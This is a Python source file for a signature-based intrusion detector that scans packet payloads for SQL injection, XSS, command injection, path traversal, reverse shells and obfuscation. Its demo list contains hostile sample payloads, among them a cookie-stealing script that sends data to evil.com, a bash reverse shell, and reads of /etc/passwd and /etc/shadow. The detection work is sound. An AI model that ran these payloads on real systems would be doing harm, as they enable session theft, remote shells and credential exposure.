import re, base64, urllib.parse
from datetime import datetime

SIGS = [
    ("SQLi",         "CRITICAL", re.compile(r"\bunion\b.{0,20}\bselect\b|\bselect\b.{0,40}\bfrom\b|\bdrop\s+table\b|\bor\b\s*['\"]?\s*1\s*=\s*1|sleep\(\d+\)|waitfor\s+delay", re.I), "SQL injection payload"),
    ("SQLi",         "HIGH",     re.compile(r"--\s*$|#\s*$|/\*.*\*/|\binformation_schema\b|\binto\s+outfile\b", re.I), "SQL comment / enumeration"),
    ("XSS",          "HIGH",     re.compile(r"<script[\s>]|javascript\s*:|on(load|error|click|mouseover|focus)\s*=|<iframe", re.I), "XSS payload detected"),
    ("CMDi",         "CRITICAL", re.compile(r";\s*(ls|cat|id|whoami|wget|curl|nc|bash|sh)\b|\|\s*(ls|id|cat|bash)\b|`[^`]{0,60}`", re.I), "OS command injection"),
    ("PathTraversal", "HIGH",    re.compile(r"(\.\./){2,}|\.\.%2[fF]|/etc/passwd|/etc/shadow|windows/system32", re.I), "Directory traversal"),
    ("ReverseShell",  "CRITICAL",re.compile(r"bash\s+-i\s*>&?\s*/dev/tcp/|nc\s+-[el].+\d+|python\s+-c\s+.import\s+socket", re.I), "Reverse shell payload"),
    ("Obfuscation",   "HIGH",    re.compile(r"eval\s*\(\s*base64_decode|fromcharcode|\\x[0-9a-f]{2}(\\x[0-9a-f]{2}){4,}", re.I), "Encoded/obfuscated payload"),
]

DEMO_PAYLOADS = [
    ("10.0.0.5",  "10.0.0.1", 54321, 80, "GET /login?id=1' OR '1'='1' -- HTTP/1.1\r\nHost: target.com"),
    ("10.0.0.5",  "10.0.0.1", 54322, 80, "POST /search\r\n\r\nq=test' UNION SELECT username,password FROM users --"),
    ("10.0.0.7",  "10.0.0.1", 55001, 80, "GET /page?name=<script>document.location='http://evil.com/?c='+document.cookie</script>"),
    ("10.0.0.9",  "10.0.0.1", 56001, 80, "GET /admin?cmd=;cat+/etc/passwd HTTP/1.1"),
    ("10.0.0.11", "10.0.0.1", 57001, 80, "POST /upload\r\n\r\nbash -i >& /dev/tcp/192.168.1.200/4444 0>&1"),
    ("10.0.0.13", "10.0.0.1", 58001, 80, "GET /file?path=../../../../../../etc/shadow"),
    ("10.0.0.15", "10.0.0.1", 59001, 80, "GET /exec?cmd=eval(base64_decode(cGhwaW5mbygpOw==))"),
    ("10.0.0.2",  "10.0.0.1", 60001, 80, "GET /index.html HTTP/1.1\r\nHost: target.com"),
]

def _decode(payload):
    variants = [payload]
    try:
        d = urllib.parse.unquote(urllib.parse.unquote(payload))
        if d != payload: variants.append(d)
    except: pass
    try:
        blobs = re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", payload)
        for b in blobs:
            dec = base64.b64decode(b + "==").decode("utf-8", errors="ignore")
            if dec and len(dec) > 4: variants.append(dec)
    except: pass
    return variants

def _inspect(payload, src_ip, dst_ip, sport, dport):
    findings = []
    for variant in _decode(payload):
        for (cat, sev, pat, desc) in SIGS:
            m = pat.search(variant)
            if m:
                ctx = variant[max(0,m.start()-15):m.end()+40].strip()
                findings.append({
                    "category": cat, "severity": sev, "description": desc,
                    "src": f"{src_ip}:{sport}", "dst": f"{dst_ip}:{dport}",
                    "match": ctx[:100], "decoded": variant != payload,
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                })
                break
    return findings

def run_demo_analysis():
    findings = []
    for src, dst, sp, dp, payload in DEMO_PAYLOADS:
        findings.extend(_inspect(payload, src, dst, sp, dp))
    findings.sort(key=lambda x: {"CRITICAL":0,"HIGH":1,"MEDIUM":2}.get(x["severity"],9))
    return {
        "source": "demo",
        "total_packets": len(DEMO_PAYLOADS),
        "total_findings": len(findings),
        "findings": findings,
        "attack_ips": list({f["src"].split(":")[0] for f in findings}),
    }

def analyze_pcap(path):
    try:
        from scapy.all import rdpcap, IP, TCP, Raw
        packets  = rdpcap(path)
        findings = []
        for i, pkt in enumerate(packets):
            if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw):
                try:
                    payload = pkt[Raw].load.decode("utf-8", errors="replace")
                    findings.extend(_inspect(payload, pkt[IP].src, pkt[IP].dst, pkt[TCP].sport, pkt[TCP].dport))
                except: pass
        findings.sort(key=lambda x: {"CRITICAL":0,"HIGH":1,"MEDIUM":2}.get(x["severity"],9))
        return {
            "source": path, "total_packets": len(packets),
            "total_findings": len(findings), "findings": findings,
            "attack_ips": list({f["src"].split(":")[0] for f in findings}),
        }
    except ImportError:
        return run_demo_analysis()
